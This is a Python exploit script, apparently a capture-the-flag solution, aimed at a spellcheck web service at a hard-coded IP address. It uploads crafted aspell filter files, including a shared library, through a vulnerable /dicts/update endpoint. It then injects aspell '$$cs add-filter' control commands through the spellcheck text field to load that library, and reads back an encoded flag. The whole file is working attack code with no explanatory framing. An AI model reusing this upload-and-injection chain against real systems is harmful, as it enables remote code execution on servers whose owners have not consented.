#!/usr/bin/env python3

import requests
from code import interact
from base64 import b64decode
import json

TO_UPLOAD = ["blub.amf", "blub-filter.info", "blub-filter.so"]
HEADERS = {"Content-Type": "application/x-www-form-urlencoded"}
SERVER = "http://116.202.161.100:5000"

# Exploit vulnerability in /dicts/update to upload custom aspell filter files
for file in TO_UPLOAD:
  requests.get('http://116.202.161.100:5000/dicts/update', files={'dict': (file, open("aspell-attack-filter/" + file, 'rb'))})

# Activate the custom aspell filter
# $$cs add-filter-path,/home/challenge/challenge/dicts/
# $$cs add-filter,blub
# +blub
requests.post(SERVER + "/spellcheck", data='text=$$cs+add-filter-path,/home/challenge/challenge/dicts/%0a$$cs+add-filter,blub%0a%2bblub', headers=HEADERS)

# Grab the flag
resp = requests.get(SERVER + "/dicts")
dicts_json = json.loads(resp.text)
encoded_flag = dicts_json["dicts"][-1][::-1] # [-1] -> last file, [::-1] -> reverse characters
flag = b64decode(encoded_flag).decode().strip()

print(f"Flag = {flag}")

